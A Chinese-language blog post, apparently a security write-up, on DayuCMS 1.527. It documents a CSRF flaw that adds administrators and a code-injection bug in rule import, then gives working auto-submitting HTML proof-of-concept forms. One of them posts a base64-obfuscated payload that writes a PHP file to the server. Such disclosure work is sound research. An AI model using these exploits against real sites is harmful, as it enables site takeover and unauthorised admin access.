---
layout: post
title: "DayuCMS 1.527 CSRF漏洞可GetShell"
---

# 0x00 背景

下载链接：
站长之家：<http://down.chinaz.com/soft/34205.htm>
官网：<http://www.dayucms.com/show/?id=105&page=1&siteid=1>

首先是感觉代码加固过，可能被之前的白帽子审计过，审计完才发现JoyChou早已对1.526的版本撸过一遍了，具体见：<http://www.joychou.org/index.php/web/dayucms-1-526-foreground-remote-code-execution.html>

<!-- more -->

# 0x01 CSRF

初看源码时感觉IP是无法伪造的，XSS和SQL注入方面代码当中也有一些加固。想要找找短板，于是乎来到比较容易被忽略的CSRF。首先利用管理员账号登录后台，看看在一些表单提交处是否有hidden的token，在添加管理员处用burp抓包看看：

![][1]

的确是没有的，只有一些添加的管理员信息，再到对应的代码中看看，在dayucms.php的38行，是要对应包含admin/admin.inc.php文件：

![][2]

在admin.inc.php的开头并没有对referer进行验证就开始操作对应的action：

![][3]

于是一趟下来就很愉快：

![][4]

下面简单给个PoC代码

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
    <title>test</title>
</head>
<body>
    <form action="http://localhost/dayucms/dayucms.php?file=admin&action=add&roleid=1" method="post">
        <input type="hidden" name="do_submit" value="1">
        <input type="hidden" name="newadmin[roleid]" value="1">
        <input type="hidden" name="newadmin[username]" value="larry">
        <input type="hidden" name="newadmin[password]" value="larry">
        <input type="hidden" name="newadmin[category][]" value="0">
        <input type="hidden" name="newadmin[allowmultilogin]" value="1">
        <input type="hidden" name="newadmin[disabled]" value="0">
    </form>

    <script type="text/javascript">
        document.forms[0].submit();
    </script>
</body>
</html>
{% endhighlight %}

最后使用虚拟机搭建PoC来验证CSRF，结果可成功添加管理员：

![][5]

# 0x02 代码执行

本来以为就存在个CSRF，不过再耐心看看也是定位到了global.func.php的string2array函数，很明显得存在代码注入可执行任意php代码：

![][6]

可是再一查找全局调用该函数的地方，可能由于代码之前被爆过一次漏洞，发现用到的php脚本都是和后台相关联的，也就是需要登录后台才可以利用：

![][7]

所以就定位到在gather.class.php中gather对象的import方法会$data[1]字段在base64解码后传入string2array函数：

![][8]

对应得在gather.inc.php文件中对规则的导入使用import这一action，进而可以造成代码注入执行：

![][9]

在后台导入规则处传入`larry-'larry';phpinfo()的base64`编码`bGFycnk=-J2xhcnJ5JztwaHBpbmZvKCk=`后（'-'分割），即可执行php代码：

![][10]

# 0x03 结合

后台执行代码太low怎么办，那就结合呀，正好利用CSRF就可以GetShell了，原理也是相同的，如图所示：

![][11]

PoC代码如下：

{% highlight html %}
<!DOCTYPE html>
<html>
<head>
    <title>test</title>
</head>
<body>
    <form action="http://192.168.1.103/dayucms/dayucms.php?mod=gather&file=gather&action=import" method="post">
        <input type="hidden" name="do_submit" value="1">
        <input type="hidden" name="importdata" value="bGFycnk=-MTtmcHV0cyhmb3BlbihiYXNlNjRfZGVjb2RlKCdiR0Z5Y25rdWNHaHcnKSwndycpLGJhc2U2NF9kZWNvZGUoJ1BEOXdhSEFnY0dod2FXNW1ieWdwT3lBL1BnJykp">
        <input type="hidden" name="1" value="导入规则">
    </form>

    <script type="text/javascript">
        document.forms[0].submit();
    </script>
</body>
</html>
{% endhighlight %}

[1]: http://ojyzyrhpd.bkt.clouddn.com/20170301/1.png
[2]: http://ojyzyrhpd.bkt.clouddn.com/20170301/2.png
[3]: http://ojyzyrhpd.bkt.clouddn.com/20170301/3.png
[4]: http://ojyzyrhpd.bkt.clouddn.com/20170301/4.png
[5]: http://ojyzyrhpd.bkt.clouddn.com/20170301/5.png
[6]: http://ojyzyrhpd.bkt.clouddn.com/20170301/6.png
[7]: http://ojyzyrhpd.bkt.clouddn.com/20170301/7.png
[8]: http://ojyzyrhpd.bkt.clouddn.com/20170301/8.png
[9]: http://ojyzyrhpd.bkt.clouddn.com/20170301/9.png
[10]: http://ojyzyrhpd.bkt.clouddn.com/20170301/10.png
[11]: http://ojyzyrhpd.bkt.clouddn.com/20170301/11.png